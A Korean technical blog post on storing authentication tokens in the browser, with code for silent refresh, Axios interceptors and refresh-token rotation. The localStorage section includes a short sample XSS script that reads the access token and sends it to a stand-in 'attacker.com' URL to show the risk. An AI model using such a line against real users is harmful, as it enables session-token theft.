---
title: "토큰 저장 전략 — 브라우저에서 인증 토큰 안전하게 관리하기"
description: "localStorage·sessionStorage·HttpOnly Cookie·메모리 저장소의 XSS/CSRF 위험을 비교하고, Access Token과 Refresh Token을 분리 저장하는 전략, Silent Refresh 구현, Axios 인터셉터 패턴을 정리합니다."
author: "PALDYN Team"
pubDate: "2026-05-24"
archiveOrder: 8
type: "knowledge"
category: "JavaScript"
tags: ["JavaScript", "인증", "JWT", "AccessToken", "RefreshToken", "XSS", "CSRF", "Cookie", "실전", "보안"]
featured: false
draft: false
---

[지난 글](/posts/real-structured-logs/)에서 구조화 로그와 분산 추적 ID 전파를 살펴봤습니다. 이번에는 **인증 토큰 저장 전략**입니다. JWT 기반 인증에서 Access Token과 Refresh Token을 브라우저에 어디에, 어떻게 저장해야 하는지—XSS와 CSRF 두 공격 벡터를 동시에 방어하면서 UX를 유지하는 방법을 정리합니다.

![토큰 저장소별 보안 비교](/assets/posts/real-token-storage-comparison.svg)

## 저장소 선택의 핵심 트레이드오프

### localStorage / sessionStorage

JavaScript에서 직접 접근할 수 있어 구현이 쉽습니다. 하지만 XSS 취약점이 있으면 공격자의 스크립트도 같은 권한으로 `localStorage.getItem('token')`을 실행할 수 있습니다.

```javascript
// ❌ XSS 공격으로 탈취 가능
localStorage.setItem('access_token', jwt);

// 공격자 스크립트 (XSS)
const stolen = localStorage.getItem('access_token');
fetch('https://attacker.com/steal?t=' + stolen);
```

CSRF 공격에는 강합니다—쿠키가 아니라 `Authorization` 헤더로 전송하기 때문입니다.

### HttpOnly Cookie

`HttpOnly` 플래그가 설정된 쿠키는 JavaScript에서 읽을 수 없습니다. XSS로 탈취할 수 없습니다.

```http
Set-Cookie: refresh_token=abc123; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh; Max-Age=604800
```

`SameSite=Strict`를 추가하면 다른 사이트에서 유발한 요청(CSRF)에 쿠키가 포함되지 않습니다. 단, 쿠키는 자동으로 전송되므로 `SameSite` 설정이 없으면 CSRF에 취약합니다.

### 메모리 (변수)

```javascript
let accessToken = null; // 클로저 또는 모듈 스코프

export function setToken(token) { accessToken = token; }
export function getToken()      { return accessToken; }
export function clearToken()    { accessToken = null; }
```

페이지를 새로고침하면 사라지는 단점이 있지만, Refresh Token으로 재발급하면 해결됩니다.

---

## 권장 전략: AT = 메모리, RT = HttpOnly Cookie

![Silent Refresh 흐름](/assets/posts/real-token-storage-flow.svg)

- **Access Token**: 짧은 수명(15분)으로 메모리에 저장. 새로고침 시 Refresh Token으로 재발급
- **Refresh Token**: 긴 수명(7일)으로 HttpOnly Secure SameSite Cookie에 저장. JS에서 접근 불가

---

## Silent Refresh 구현

401 응답을 받았을 때 사용자를 로그아웃시키지 않고 자동으로 토큰을 재발급합니다.

```javascript
// src/auth/tokenManager.js
let accessToken = null;
let refreshPromise = null; // 중복 refresh 방지

export const tokenManager = {
  get: ()    => accessToken,
  set: (tok) => { accessToken = tok; },
  clear: ()  => { accessToken = null; },

  async refresh() {
    if (refreshPromise) return refreshPromise; // 이미 재발급 중이면 대기

    refreshPromise = fetch('/api/auth/refresh', {
      method:      'POST',
      credentials: 'include', // RT 쿠키 자동 포함
    })
      .then(async res => {
        if (!res.ok) throw new Error('refresh failed');
        const { accessToken: newAt } = await res.json();
        accessToken = newAt;
        return newAt;
      })
      .finally(() => { refreshPromise = null; });

    return refreshPromise;
  },
};
```

### Axios 인터셉터로 자동 재발급

```javascript
// src/api/client.js
import axios from 'axios';
import { tokenManager } from '../auth/tokenManager.js';

const client = axios.create({ baseURL: '/api' });

// 요청 인터셉터: AT를 헤더에 추가
client.interceptors.request.use(config => {
  const token = tokenManager.get();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});

// 응답 인터셉터: 401 처리
client.interceptors.response.use(
  res => res,
  async err => {
    const original = err.config;

    if (err.response?.status === 401 && !original._retry) {
      original._retry = true;

      try {
        await tokenManager.refresh();
        original.headers.Authorization = `Bearer ${tokenManager.get()}`;
        return client(original); // 원래 요청 재시도
      } catch {
        tokenManager.clear();
        window.location.href = '/login'; // 재발급도 실패 → 로그아웃
      }
    }

    return Promise.reject(err);
  }
);

export default client;
```

`_retry` 플래그로 무한 루프를 방지합니다. 401이 다시 오면 (RT도 만료) 로그아웃 처리합니다.

---

## 서버 사이드 — Refresh 엔드포인트 구현

```javascript
// Node.js/Express
app.post('/api/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  if (!refreshToken) return res.status(401).json({ error: 'no refresh token' });

  try {
    const payload = jwt.verify(refreshToken, process.env.RT_SECRET);

    // RT 로테이션: 기존 RT 무효화 후 새 RT 발급
    await db.invalidateRefreshToken(refreshToken);
    const newRt = await db.createRefreshToken(payload.userId);

    const accessToken = jwt.sign(
      { sub: payload.userId, role: payload.role },
      process.env.AT_SECRET,
      { expiresIn: '15m' }
    );

    // 새 RT를 쿠키로
    res.cookie('refresh_token', newRt, {
      httpOnly: true,
      secure:   process.env.NODE_ENV === 'production',
      sameSite: 'Strict',
      path:     '/api/auth/refresh', // 이 경로에서만 전송
      maxAge:   7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken });
  } catch {
    res.clearCookie('refresh_token');
    res.status(401).json({ error: 'invalid refresh token' });
  }
});
```

**RT 로테이션**: Refresh할 때마다 기존 RT를 무효화하고 새 RT를 발급합니다. RT가 탈취되어도 한 번 사용되면 다음 사용에서 탐지됩니다.

---

## 초기 로드 시 토큰 복원

페이지를 새로고침하면 메모리의 AT가 사라집니다. 앱 초기화 시 자동으로 재발급합니다.

```javascript
// src/app.js 또는 React의 _app.js
async function initAuth() {
  try {
    // RT 쿠키가 있으면 AT 재발급
    await tokenManager.refresh();
    console.log('인증 복원 성공');
  } catch {
    console.log('비로그인 상태');
  }
}

// 앱 마운트 전에 실행
await initAuth();
mountApp();
```

---

## 보안 체크리스트

| 항목 | 설정 |
|---|---|
| Access Token 수명 | 15분 이하 |
| Refresh Token 수명 | 7일 (용도에 따라 조정) |
| RT Cookie 플래그 | HttpOnly; Secure; SameSite=Strict |
| RT Cookie Path | `/api/auth/refresh`로 제한 |
| RT 로테이션 | 매 Refresh마다 새 RT 발급 |
| AT 저장소 | 메모리 변수 (localStorage 금지) |
| HTTPS | 프로덕션에서 Secure Cookie 필수 |

---

**지난 글:** [구조화 로그 실전 — JSON 로그와 상관 ID](/posts/real-structured-logs/)

**다음 글:** [페이지네이션 클라이언트 — 커서·오프셋·무한 스크롤 구현](/posts/real-pagination-client/)

<br>
읽어주셔서 감사합니다. 😊
